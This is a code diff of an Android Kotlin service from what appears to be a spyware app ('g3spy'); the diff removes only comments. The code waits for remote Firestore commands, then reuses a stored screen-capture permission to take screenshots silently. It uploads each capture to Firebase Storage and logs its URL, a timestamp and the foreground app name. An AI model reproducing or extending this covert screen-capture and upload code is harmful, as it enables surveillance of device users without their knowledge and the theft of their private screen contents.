@@ -31,7 +31,6 @@ class ScreenshotService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private var lastProcessedCommandId: String? = null
     
-    // Media projection variables
     private var virtualDisplay: VirtualDisplay? = null
     private var mediaProjection: MediaProjection? = null
     private var imageReader: ImageReader? = null
@@ -61,22 +60,20 @@ class ScreenshotService : Service() {
     
     private fun captureAndUploadScreenshot(command: DocumentSnapshot) {
         try {
-            // Use proper media projection to capture a real screenshot
+            
             val bitmap = captureScreenshot()
             
             if (bitmap != null) {
-                // Convert bitmap to byte array
+                
                 val baos = ByteArrayOutputStream()
                 bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos)
                 val data = baos.toByteArray()
                 
-                // Create a temp file
                 val tempFile = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                 val fos = FileOutputStream(tempFile)
                 fos.write(data)
                 fos.close()
                 
-                // Upload to Firebase Storage
                 val storageRef = storage.reference.child("screenshots/${UUID.randomUUID()}.jpg")
                 val uploadTask = storageRef.putFile(android.net.Uri.fromFile(tempFile))
                 
@@ -89,7 +86,6 @@ class ScreenshotService : Service() {
                     if (task.isSuccessful) {
                         val downloadUrl = task.result.toString()
                         
-                        // Store metadata in Firestore
                         val screenshotData = hashMapOf(
                             "url" to downloadUrl,
                             "timestamp" to com.google.firebase.Timestamp.now(),
@@ -99,7 +95,6 @@ class ScreenshotService : Service() {
                         
                         db.collection("screenshots").add(screenshotData)
                         
-                        // Clean up temp file
                         tempFile.delete()
                     }
                 }
@@ -114,10 +109,9 @@ class ScreenshotService : Service() {
         }
     }
     
-
     private fun setupMediaProjection() {
         try {
-            // Get screen metrics
+            
             val wm = getSystemService(WINDOW_SERVICE) as WindowManager
             val metrics = DisplayMetrics()
             wm.defaultDisplay.getMetrics(metrics)
@@ -125,14 +119,11 @@ class ScreenshotService : Service() {
             screenHeight = metrics.heightPixels
             screenDensity = metrics.densityDpi
             
-            // Retrieve media projection data from SharedPreferences
             val prefs = getSharedPreferences("g3spy_screenshot_prefs", MODE_PRIVATE)
             val resultCode = prefs.getInt("mediaProjectionResultCode", 0)
             
-            // Create media projection
             mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             
-            // Recreate the intent for the service to use
             val intent = Intent()
             val packageName = prefs.getString("mediaProjectionResultDataPackage", null)
             val className = prefs.getString("mediaProjectionResultDataClass", null)
@@ -152,20 +143,19 @@ class ScreenshotService : Service() {
     }
     
     private fun captureScreenshot(): Bitmap? {
-        // If we don't have a media projection yet, try to set it up
+        
         if (mediaProjection == null) {
             setupMediaProjection()
             if (mediaProjection == null) return null
         }
         
         try {
-            // Create an ImageReader instance to capture the screen
+            
             imageReader = ImageReader.newInstance(
                 screenWidth, screenHeight,
                 PixelFormat.RGBA_8888, 1
             )
             
-            // Create a virtual display that captures the screen contents
             virtualDisplay = mediaProjection?.createVirtualDisplay(
                 "ScreenCapture",
                 screenWidth, screenHeight, screenDensity,
@@ -173,10 +163,8 @@ class ScreenshotService : Service() {
                 imageReader?.surface, null, handler
             )
             
-            // Wait a bit to ensure the screen is captured
             Thread.sleep(100)
             
-            // Get the latest image from the ImageReader
             val image = imageReader?.acquireLatestImage()
             
             if (image != null) {
@@ -186,19 +174,16 @@ class ScreenshotService : Service() {
                 val rowStride = planes[0].rowStride
                 val rowPadding = rowStride - pixelStride * screenWidth
                 
-                // Create bitmap from buffer data
                 val bitmap = Bitmap.createBitmap(
                     screenWidth + rowPadding / pixelStride,
                     screenHeight, Bitmap.Config.ARGB_8888
                 )
                 bitmap.copyPixelsFromBuffer(buffer)
                 
-                // Clean up resources
                 image.close()
                 virtualDisplay?.release()
                 virtualDisplay = null
                 
-                // Return the captured screenshot
                 return bitmap
             }
         } catch (e: Exception) {
@@ -217,8 +202,7 @@ class ScreenshotService : Service() {
     }
     
     private fun getRunningApp(): String {
-        // For a real implementation, we'd use UsageStatsManager to get the foreground app
-        // For now, return a placeholder value
+        
         return "Current App"
     }
 
